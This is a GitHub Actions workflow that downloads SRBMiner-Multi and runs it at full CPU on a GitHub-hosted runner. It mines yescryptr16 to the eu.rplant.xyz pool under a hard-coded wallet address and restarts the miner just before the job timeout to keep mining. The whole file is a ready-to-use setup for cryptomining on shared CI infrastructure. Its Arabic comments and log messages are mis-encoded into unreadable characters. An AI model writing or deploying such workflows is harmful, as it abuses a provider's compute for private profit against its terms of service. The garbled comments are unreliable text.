name: Linux-Miner-Yescryptr16

on:
  workflow_dispatch:

jobs:
  miner:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 ุณุงุนุงุช

    steps:
      - name: Install dependencies
        run: |
          sudo apt update
          sudo apt install -y wget tar

      - name: Download SRBMiner 3.0.3 (Linux)
        run: |
          wget -O miner.tar.gz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
          mkdir -p miner
          tar -xzf miner.tar.gz -C miner

      - name: Start SRBMiner (yescryptr16) Max CPU
        run: |
          function start_miner() {
            cd miner
            folder=$(ls -d SRBMiner* | head -n 1)
            exe="$folder/SRBMiner-MULTI"
            chmod +x "$exe"
            threads=$(nproc)
            echo "โก ุชุดุบูู SRBMiner ุจุฃูุตู ุนุฏุฏ ูู ุงูุฃูููุฉ: $threads"
            nohup "$exe" -a yescryptr16 -o stratum+tcp://eu.rplant.xyz:7057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v -p start=0.4,m=solo --cpu-threads $threads > miner.log 2>&1 &
          }

          # ุชุดุบูู miner ูุฃูู ูุฑุฉ
          start_miner

      - name: Full Restart Before Timeout
        run: |
          # ุงูุงูุชุธุงุฑ 5 ุณุงุนุงุช ู40 ุฏูููุฉ = 340 ุฏูููุฉ
          wait_minutes=340
          echo "โฑ ุงูุงูุชุธุงุฑ $wait_minutes ุฏูููุฉ ูุจู ุฅุนุงุฏุฉ ุชุดุบูู ูุงูู ููminer"
          sleep $((wait_minutes * 60))

          # ูุชู ุฃู ุนูููุงุช SRBMiner ุชุนูู
          echo "โ ุฅููุงู ุงูุนูููุงุช ุงูุญุงููุฉ ููminer..."
          pkill -f SRBMiner-MULTI || true
          sleep 5

          # ุฅุนุงุฏุฉ ุชุดุบูู miner ูุงูู ุจุฃูุตู ูุฏุฑุฉ
          echo "๐ ุฅุนุงุฏุฉ ุชุดุบูู SRBMiner ุจุงููุงูู ุจุฃูุตู ูุฏุฑุงุชู"
          cd miner
          folder=$(ls -d SRBMiner* | head -n 1)
          exe="$folder/SRBMiner-MULTI"
          chmod +x "$exe"
          threads=$(nproc)
          nohup "$exe" -a yescryptr16 -o stratum+tcp://eu.rplant.xyz:7057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v -p start=0.4,m=solo --cpu-threads $threads > miner.log 2>&1 &

          # ุงูุชุธุงุฑ ุญุชู ููุงูุฉ workflow (~20 ุฏูููุฉ)
          remaining_minutes=20
          echo "โฑ ุงูุชุธุงุฑ $remaining_minutes ุฏูููุฉ ุฅุถุงููุฉ ุญุชู ููุงูุฉ workflow"
          sleep $((remaining_minutes * 60))

          echo "โ ุงูุชูุช ูุฏุฉ workflow"
